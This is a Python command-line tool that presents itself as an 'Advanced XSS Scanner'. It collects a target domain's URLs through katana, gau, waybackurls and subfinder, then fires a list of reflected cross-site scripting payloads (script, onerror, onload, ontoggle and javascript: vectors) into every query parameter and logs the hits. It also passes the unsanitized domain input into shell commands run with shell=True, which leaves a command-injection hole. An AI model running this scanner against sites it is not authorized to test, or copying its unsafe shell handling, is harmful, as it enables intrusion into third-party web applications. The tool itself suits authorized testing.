#!/usr/bin/env python3
import asyncio
import aiohttp
import subprocess
import urllib.parse
from rich.console import Console
from rich.progress import track

console = Console()

# -----------------------------
# Banner
# -----------------------------
def banner():
    console.print("[bold cyan]\n====== Advanced XSS Scanner ======\n[/bold cyan]")

# -----------------------------
# URL Collector (Katana/Gau/Wayback)
# -----------------------------
def collect_urls(domain):
    console.print("[+] Collecting URLs (katana/gau/wayback)...", style="yellow")
    urls = set()

    tools = [
        f"katana -u {domain}",
        f"gau {domain}",
        f"waybackurls {domain}"
    ]

    for cmd in tools:
        try:
            out = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)
            urls.update(out.splitlines())
        except:
            pass

    console.print(f"[+] Total URLs collected: {len(urls)}", style="green")
    return list(urls)

# -----------------------------
# Subdomain Enumeration (subfinder only)
# -----------------------------
def subfinder(domain):
    console.print("[+] Running subfinder...", style="yellow")
    try:
        out = subprocess.check_output(f"subfinder -d {domain}", shell=True, text=True, stderr=subprocess.DEVNULL)
        subs = out.splitlines()
        console.print(f"[+] Subdomains found: {len(subs)}", style="green")
        return subs
    except:
        console.print("[!] Subfinder not installed or failed.", style="red")
        return []

# -----------------------------
# Parameter Finder
# -----------------------------
def find_param_urls(urls):
    param_urls = [u for u in urls if "=" in u]
    console.print(f"[+] Parameterized URLs: {len(param_urls)}", style="green")
    return param_urls

# -----------------------------
# Async XSS Check
# -----------------------------
async def check_xss(session, url, param, payload):
    parsed = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qs(parsed.query)
    qs[param] = payload
    final_query = urllib.parse.urlencode(qs, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{final_query}"

    try:
        async with session.get(test_url, timeout=8) as r:
            text = await r.text()
            if payload in text:
                console.print(f"[+] XSS hit on this URL: {test_url}", style="bold red")
                console.print(f"    Payload: {payload}", style="yellow")
                return test_url
    except:
        return None

async def run_xss_tests(urls, payloads, speed):
    results = []
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=50 if speed == "fast" else 10)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        for u in urls:
            parsed = urllib.parse.urlsplit(u)
            qs = urllib.parse.parse_qs(parsed.query)
            for p in qs:
                for payload in payloads:
                    tasks.append(check_xss(session, u, p, payload))

        for res in track(await asyncio.gather(*tasks), description="[cyan]Scanning...[/cyan]"):
            if res:
                results.append(res)
    return results

# -----------------------------
# Main
# -----------------------------
def run():
    banner()
    domain = input("Enter domain (example.com): ").strip()

    # Subfinder option
    sub_enum = input("Do you want to use subfinder? (yes/no): ").lower()
    if sub_enum == "yes":
        subs = subfinder(domain)

    # Speed option
    speed = input("Choose speed (fast/slow): ").lower()
    if speed not in ["fast", "slow"]:
        speed = "slow"

    # Payload mode
    mode = input("Choose payload mode (basic/aggressive): ").lower()
    if mode == "basic":
        payloads = [
            "test123",
            "<script>alert(1)</script>"
        ]
    else:
        payloads = [
            "test123",
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "'\"><svg/onload=alert(1)>",
            "`\"><iframe src=javascript:alert(1)>",
            "\"><body onload=alert(1)>",
            "'\"><details open ontoggle=alert(1)>"
        ]

    # Collect URLs
    urls = collect_urls(domain)
    param_urls = find_param_urls(urls)

    console.print("\n[+] Starting XSS Scan...\n", style="yellow")

    results = asyncio.run(run_xss_tests(param_urls, payloads, speed))

    console.print(f"\n[+] POSSIBLE XSS FOUND: {len(results)}", style="bold red")
    if results:
        with open("results.txt", "w") as f:
            f.write("\n".join(results))
        console.print("[+] Results saved to results.txt", style="green")

    console.print("\nDone.\n", style="cyan")

if __name__ == "__main__":
    run()
